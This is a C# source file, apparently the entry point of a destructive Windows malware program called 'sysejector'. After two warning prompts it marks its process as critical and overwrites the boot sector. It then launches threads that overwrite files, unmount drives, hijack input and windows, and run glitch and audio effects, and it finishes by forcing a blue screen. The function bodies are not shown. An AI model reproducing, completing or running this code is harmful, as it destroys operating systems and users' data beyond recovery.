using System;
using System.Collections.Generic;
using System.Threading;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace sysejector
{
    internal class program
    {
        [STAThread]
        static void Main(string[] args)
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            if (MessageBox.Show(
                "You Know What This Does So I Will Not Write For A Long Time...\n" +
                "Just Know That SapphireWindows Is Not Responsible For Any Damage.",
                "sysejector.exe - First Warning", MessageBoxButtons.YesNo,
                MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2
            ) == DialogResult.Yes)
            {
                if (MessageBox.Show(
                    "This Is Your Last Warning, Haven't I Explained The Risks?!",
                    "sysejector.exe - Last Warning", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2
                ) == DialogResult.Yes)
                {
                    Thread wndMess = new Thread(payloads.window);
                    Thread typing = new Thread(payloads.typing);
                    Thread cursor = new Thread(payloads.cursor);
                    Thread input = new Thread(payloads.inputMess);
                    Thread destroy = new Thread(destruction.overwriteFiles);
                    Thread drives = new Thread(destruction.unmountDrives);
                    Thread msgbox = new Thread(payloads.msgbox);
                    Thread glitch = new Thread(effects.glitch);
                    Thread openFiles = new Thread(payloads.openFiles);
                    Thread rgbquad = new Thread(effects.rgbquad);
                    Thread blurring = new Thread(effects.blurry);
                    Thread cursors = new Thread(effects.cursors);
                    Thread refresh = new Thread(payloads.refreshes);

                    destruction.setProcessCritical();
                    destruction.overwriteBoot();
                    Thread.Sleep(5000);

                    msgbox.Start();
                    wndMess.Start();
                    destroy.Start();
                    openFiles.Start();
                    drives.Start();
                    typing.Start();
                    cursor.Start();
                    input.Start();

                    glitch.Start();
                    cursors.Start();
                    refresh.Start();
                    bytebeats.bytebeat1(48000, 30);
                    rgbquad.Start();
                    bytebeats.bytebeat2(48000, 30);
                    blurring.Start();
                    bytebeats.bytebeat3(48000, 30);

                    destruction.blueScreen();
                }
                else
                {
                    Environment.Exit(0);
                }
            }
            else
            {
                Environment.Exit(0);
            }
        }
    }
}
